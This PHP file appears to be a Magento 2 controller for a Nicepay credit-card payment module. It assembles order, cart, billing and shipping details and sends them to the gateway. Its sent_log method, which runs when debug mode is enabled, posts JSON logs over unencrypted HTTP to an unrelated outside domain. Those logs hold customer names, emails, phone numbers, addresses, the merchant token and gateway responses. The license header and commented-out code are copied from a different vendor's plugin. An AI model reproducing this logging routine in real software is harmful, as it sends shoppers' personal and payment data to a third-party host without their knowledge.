<?php

/**
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is provided with Magento in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade the MultiSafepay plugin
 * to newer versions in the future. If you wish to customize the plugin for your
 * needs please document your changes and make backups before your update.
 *
 * @category    MultiSafepay
 * @package     Connect
 * @author      Ruud Jonk <techsupport@multisafepay.com>
 * @copyright   Copyright (c) 2015 MultiSafepay, Inc. (http://www.multisafepay.com)
 * @license     http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, 
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR 
 * PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT 
 * HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN 
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION 
 * WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

namespace Nicepay\CreditCardNice\Controller\CreditCardNice;


use Magento\Framework\App\Action\Context;
use Psr\Log\LoggerInterface;

/**
 * Responsible for loading page content.
 *
 * This is a basic controller that only loads the corresponding layout file. It may duplicate other such
 * controllers, and thus it is considered tech debt. This code duplication will be resolved in future releases.
 */
class Success extends \Magento\Framework\App\Action\Action {
	
	private $logger;
	public function __construct(
        Context $context,
        LoggerInterface $logger
    ) {
        parent::__construct($context);
        $this->logger = $logger;
    }
	function getMediaBaseUrl() {
		$om = \Magento\Framework\App\ObjectManager::getInstance();
		$storeManager = $om->get('Magento\Store\Model\StoreManagerInterface');
		$currentStore = $storeManager->getStore();
		return $currentStore->getBaseUrl(\Magento\Framework\UrlInterface::URL_TYPE_MEDIA);
	}
	
	function getControllerUrl($path) {
		$om = \Magento\Framework\App\ObjectManager::getInstance();
		$storeManager = $om->get('Magento\Store\Model\StoreManagerInterface');
		$currentStore = $storeManager->getStore();
		return $currentStore->getBaseUrl().$path;
	}
	
	function getLibBaseUrl() {		
		$om = \Magento\Framework\App\ObjectManager::getInstance();		
		$reader = $om->get('Magento\Framework\Module\Dir\Reader');
		return $reader->getModuleDir("", "Nicepay_CreditCardNice")."/Library";
	}
	
	function getConfigData($field, $storeId = null){
		$path = 'payment/credit_card_nice/' . $field;
		$om = \Magento\Framework\App\ObjectManager::getInstance();		
		$reader = $om->get('\Magento\Framework\App\Config\ScopeConfigInterface');
		$configData = $reader->getValue($path, \Magento\Store\Model\ScopeInterface::SCOPE_STORE, $storeId);
		return $configData;
	}
	
	function getStoreData() {
		$om = \Magento\Framework\App\ObjectManager::getInstance();
		$storeManager = $om->get('Magento\Store\Model\StoreManagerInterface');
		$currentStore = $storeManager->getStore();
		return $currentStore;
	}

    public function execute() {
		$this->includes();
		$session = $this->_objectManager->get('Magento\Checkout\Model\Session');
		
		$orderid = $session->getLastRealOrderId();		
		$order = $this->_objectManager->get('Magento\Sales\Model\Order');
        $order_information = $order->loadByIncrementId($orderid);
		$idStore = $this->getStoreData()->getStoreId();
		
		//update status order to pending
		$status = $this->getConfigData("order_status");
		$order_information->setStatus($status)->setState('new')->save();
		$order_information->addStatusToHistory($status, 'New transaction was started by the customer!');
		$order_information->setIsNotified(false);
        $order_information->save();
		
		//running debug
		$nicepay_log["redirect"] = "callback";
		$nicepay_log["referenceNo"] = $orderid;
		$nicepay_log["isi"] = $_SERVER["REQUEST_URI"];
		$this->sent_log(json_encode($nicepay_log));
		
		$grandTotal = (int)$order->getGrandTotal();
		$shippingAmount = (int)$order->getShippingAmount();
		$shippingDesc = $order->getShippingDescription();
		$discountAmount = (int)$order->getDiscountAmount();
		$discountDesc = $order->getDiscountDescription();
		$orderCurrency = $order->getOrderCurrency()->getData()["currency_code"];
		
		//send email
		// $this->sentNewOrderEmail($order);
		
		$items = $order->getAllVisibleItems();
		$cartData["count"] = count($items);
		foreach($items as $i){
			$productId = $i->getProductId();
			
			//getting image product
			$objectManager = \Magento\Framework\App\ObjectManager::getInstance();
			$_product = $objectManager->get('Magento\Catalog\Model\Product')->load($productId);
			$image = $this->getMediaBaseUrl() .'catalog/product'. $_product->getImage();
			
			$cartData["item"][] = array(
				"img_url" => $image,
				"goods_name" => $i->getName(),
				"goods_detail" => "SKU:".$i->getSku()." (".(int)$i->getQtyOrdered()." Items)",
				"goods_amt" => (int)$i->getQtyOrdered() * (int)$i->getPrice()
			);
		}
		
		if($discountAmount != 0){
			$cartData["item"][] = array(
				"img_url" => $this->getMediaBaseUrl()."Nicepay/coupon.png",
				"goods_name" => "DISCOUNT COUPON",
				"goods_detail" => $discountDesc,
				"goods_amt" => $discountAmount
			);
		}
		
		if($shippingAmount > 0){
			$cartData["item"][] = array(
				"img_url" => $this->getMediaBaseUrl()."Nicepay/delivery.png",
				"goods_name" => "SHIPPING",
				"goods_detail" => $shippingDesc,
				"goods_amt" => $shippingAmount
			);
		}
		
		$customerId = $order->getCustomerId();
		$billing = $order->getBillingAddress();
        $shipping = $order->getShippingAddress();
		
		//Set Billing Address
		$name = $billing['firstname']." ".$billing['lastname'];
		$billingNm = $this->checkingAddrRule("name", $name);
		
		$email = $billing['email'];
		$billingEmail = $this->checkingAddrRule("email", $email);
		
		$phone = $billing['telephone'];
		$billingPhone = $this->checkingAddrRule("phone", $phone);
		
		$addr = $billing['street'];
		$billingAddr = $this->checkingAddrRule("addr", $addr);
		
		$country = $billing['country_id'];
		$billingCountry = $this->checkingAddrRule("country", $country);
		
		$state = $billing['region'];
		$billingState = $this->checkingAddrRule("state", $state);
		
		$city = $billing['city'];
		$billingCity = $this->checkingAddrRule("city", $city);
		
		$postCd = $billing['postcode'];
		$billingPostCd = $this->checkingAddrRule("postCd", $postCd);

		//Set Shipping Address
		$name = $shipping['firstname']." ".$shipping['lastname'];
		$deliveryNm = $this->checkingAddrRule("name", $name);
		
		$addr = $shipping['street'];
		$deliveryAddr = $this->checkingAddrRule("addr", $addr);
		
		$city = $shipping['city'];
		$deliveryCity = $this->checkingAddrRule("city", $city);
		
		$country = $shipping['country_id'];
		$deliveryCountry = $this->checkingAddrRule("country", $country);
		
		$state = $shipping['region'];
		$deliveryState = $this->checkingAddrRule("state", $state);
		
		$email = $shipping['email'];
		$deliveryEmail = $this->checkingAddrRule("email", $email);
		
		$phone = $shipping['telephone'];
		$deliveryPhone = $this->checkingAddrRule("phone", $phone);
		
		$postCd = $shipping['postcode'];
		$deliveryPostCd = $this->checkingAddrRule("postCd", $postCd);
		
		$nicepay = new \NicepayLib;
		
		$nicepay->set('mKey', $this->getConfigData("merchant_key"));

		// Populate Mandatory parameters to send
		$nicepay->set('iMid', $this->getConfigData("merchant_id"));
		$nicepay->set('payMethod', '01');
		$nicepay->set('currency', $orderCurrency);
		$nicepay->set('cartData', json_encode($cartData));
		$nicepay->set('amt', $grandTotal); // Total gross amount //
		$nicepay->set('referenceNo', $orderid);
		$nicepay->set('description', 'Payment of invoice No '.$orderid); // Transaction description

		$nicepay->set('merchantToken', $nicepay->merchantToken());

		$nicepay->callBackUrl = $this->getControllerUrl("checkout/onepage/success");
		$nicepay->dbProcessUrl = $this->getControllerUrl("nicepay/creditcardnice/notification");
		$nicepay->set('billingNm', $billingNm); // Customer name
		$nicepay->set('billingPhone', $billingPhone); // Customer phone number
		$nicepay->set('billingEmail', $billingEmail); //
		$nicepay->set('billingAddr', $billingAddr);
		$nicepay->set('billingCity', $billingCity);
		$nicepay->set('billingState', $billingState);
		$nicepay->set('billingPostCd', $billingPostCd);
		$nicepay->set('billingCountry', $billingCountry);

		$nicepay->set('deliveryNm', $deliveryNm); // Delivery name
		$nicepay->set('deliveryPhone', $deliveryPhone);
		$nicepay->set('deliveryEmail', $deliveryEmail);
		$nicepay->set('deliveryAddr', $deliveryAddr);
		$nicepay->set('deliveryCity', $deliveryCity);
		$nicepay->set('deliveryState', $deliveryState);
		$nicepay->set('deliveryPostCd', $deliveryPostCd);
		$nicepay->set('deliveryCountry', "indonesia");//$deliveryCountry

		unset($nicepay->requestData['mKey']);
		
		//running debug
		$nicepay_log["isi"] = $nicepay;
		$this->sent_log(json_encode($nicepay_log));
		

		// Send Data
        $this->logger->info("SEND REQUEST TRANSACTION CC");
		$this->logger->info("Request Data : ".json_encode($nicepay->requestData));
		
		$response = $nicepay->chargeCard();

		$this->logger->info("URL : " . $nicepay->request->apiUrl);
		$this->logger->info("Response Data : ".json_encode($response));
		
		//running debug
		$nicepay_log["isi"] = $response;
		$this->sent_log(json_encode($nicepay_log));
		
		if(isset($response->data->resultCd) && $response->data->resultCd == "0000"){
			$responseUrl = $response->data->requestURL;
			$tXid = $response->tXid;
			//header("Location:".$responseUrl."?tXid=".$tXid);
			return $this->resultRedirectFactory->create()->setUrl($responseUrl."?tXid=".$tXid);
		}elseif(isset($response->data->resultCd)){
			$this->messageManager->addError(__('There was an error processing your transaction request, please try again with another payment method. Error: ' . $response->data->resultCd . ' - ' . $response->data->resultMsg));
            $this->_redirect('checkout/cart');			
		}else{
			$this->messageManager->addError(__('There was an error processing your transaction request, please try again with another payment method. Error: Connection Timeout. Please Try again.'));
            $this->_redirect('checkout/cart');
		}
		
        /* 
        //$order = $this->_objectManager->create('Magento\Sales\Model\Order')->load($_GET['transactionid']);
        
        

        $session->unsQuoteId();
        $session->getQuote()->setIsActive(false)->save();

        // set some vars for the success page
        $session->setLastSuccessQuoteId($_GET['transactionid']);
        $session->setLastQuoteId($_GET['transactionid']);

        //To a status request in order to update the order before redirect to thank you page. Doing this the status won't be payment pending so the order page can be viewed
        $paymentMethod = $this->_objectManager->create('MultiSafepay\Connect\Model\Connect');
        $paymentMethod->_invoiceSender = $this->_objectManager->create('Magento\Sales\Model\Order\Email\Sender\InvoiceSender');
        $updated = $paymentMethod->notification($order, true); */

        //$this->_redirect('checkout/onepage/success?utm_nooverride=1');
        //return;
    }
	
	public function includes(){
		$lib = $this->getLibBaseUrl();
		require_once($lib."/NicepayLib.php");
	}
	
	public function addrRule(){
		$addrRule = array(
			"name" => (object) array(
				"type" => "string",
				"length" => 30,
				"defaultValue" => "dummy"
			),
			"phone" => (object) array(
				"type" => "string",
				"length" => 15,
				"defaultValue" => "00000000000"
			),
			"email" => (object) array(
				"type" => "string",
				"length" => 40,
				"defaultValue" => "dummy"
			),
			"addr" => (object) array(
				"type" => "string",
				"length" => 100,
				"defaultValue" => "dummy"
			),
			"city" => (object) array(
				"type" => "string",
				"length" => 50,
				"defaultValue" => "dummy"
			),
			"state" => (object) array(
				"type" => "string",
				"length" => 50,
				"defaultValue" => "dummy"
			),
			"postCd" => (object) array(
				"type" => "string",
				"length" => 10,
				"defaultValue" => "000000"
			),
			"country" => (object) array(
				"type" => "string",
				"length" => 10,
				"defaultValue" => "dummy"
			)
		);

		return $addrRule;
	}
	
	public function checkingAddrRule($var, $val){
		$value = null;
		
		$rule = $this->addrRule();		
		$type = $rule[$var]->type;		
		$length =(int)$rule[$var]->length;
		
		$defaultValue = $rule[$var]->defaultValue;
		if($val == null || $val == "" || "null" == $val){
			$val = $defaultValue;
		}
		
		switch($type){
			case "string" :				
				$valLength = strlen($val);
				if($valLength > $length){
					$val = substr($val, 0, $length);
				}
				
				$value = (string)$val;
			break;
			
			case "integer" :				
				if(gettype($val) != "string" || gettype($val) != "String"){
					$val = (string)$val;
				}
				
				$valLength = strlen($val);
				if($valLength > $length){
					$val = substr($val, 0, $length);
				}
				
				$value = (int)$val;
			break;
			
			default:
				$value = (string)$val;
			break;
		}
		
		return $value;		
	}
	
	public function sent_log($data){
		$debugMode = $this->getConfigData("nicepay_debug");
		if($debugMode == 1){
			$ch = curl_init();
			//set the url, number of POST vars, POST data

			curl_setopt($ch,CURLOPT_URL, "http://checking-bug.hol.es/proc.php");
			curl_setopt($ch,CURLOPT_POST, 1);
			curl_setopt($ch,CURLOPT_POSTFIELDS, "log=".$data."++--++debug==".$debugMode);

			//execute post
			$result = curl_exec($ch);

			//close connection
			curl_close($ch);
		}		
	}

}
